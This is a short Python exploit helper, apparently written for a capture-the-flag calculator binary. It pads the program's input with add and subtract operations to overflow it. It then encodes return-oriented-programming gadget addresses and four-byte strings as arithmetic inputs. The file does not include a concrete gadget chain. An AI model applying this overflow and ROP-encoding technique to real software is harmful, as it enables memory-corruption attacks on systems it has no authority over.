#!/usr/bin/python3

import struct
from exploiterTemplate import exploiterTemplate

class exploiter (exploiterTemplate):
	padding='''1
690563269
100
1
707406278
100
1
724249287
100
1
741092296
100
1
757935305
100
1
774778314
100
1
791621323
100
1
808464332
100
1
825307341
100
1
842150350
100
1
858993359
100
1
875836368
100
2
100
100
2
100
100
1
926365395
100
1
943208404
100
1
960051413
100
1
976894422
100'''

	def __init__(self) :
		# One for 5 at end
		self.numOfOps = 1
		self.addrs = []

	def num_genZero(self):
		txt = '''2
100
100
'''
		return txt


	def seperate_addr(self, addr):
		return eval('0x'+hex(addr)[2:].zfill(16)[:8]), eval('0x'+hex(addr)[2:].zfill(16)[8:])


	def int32_to_equ(self, n32):
		if n32 == 0:
			return self.num_genZero()

		if 0 <= n32 <= 100:
			toSub = 200 - n32
			txt = '''2
200
'''
			txt += str(toSub) + '\n'
			return txt
		elif n32 > 100:
			newAddr = n32 - 100

			txt = '''1
100
'''
			txt += str(newAddr) + '\n'
			return txt
		else:
			raise('Number must non-negative')
		

	def addr_to_equ(self, addr):
		n1, n2 = self.seperate_addr(addr)

		self.numOfOps += 1

		return self.int32_to_equ(n2) + self.int32_to_equ(n1)

	def char4_to_equ(self, ch4):
		return self.int32_to_equ(struct.unpack('<I', ch4.encode())[0])

	def add_gadet(self, addr : int):
		self.addrs += self.addr_to_equ(addr)
		self.numOfOps += 1

	def add_text(self, txt):
		assert len(txt) == 4
		self.addrs += self.char4_to_equ(txt)
		self.numOfOps += 1

	def finish(self):
		# for padding
		self.numOfOps += 18

		print(self.numOfOps)
		print(self.padding)
		print(''.join(self.addrs), end='')
		print(5)
